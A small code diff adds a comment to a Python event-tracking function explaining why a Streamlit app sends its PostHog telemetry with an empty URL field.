@@ -115,6 +115,10 @@ def track(event: str, detail: str = "", session: str = ""):
     # events leave the building, and so this file stays the source of truth.
     try:
         import telemetry
+        # The app has no request path to pass — Streamlit routes with ?nav=,
+        # and its events already name themselves ("view", "session", "ref").
+        # Left blank rather than invented, so PostHog's URL column is honestly
+        # empty for the app and populated for the board.
         telemetry.capture(event, detail, session)
     except Exception:
         pass
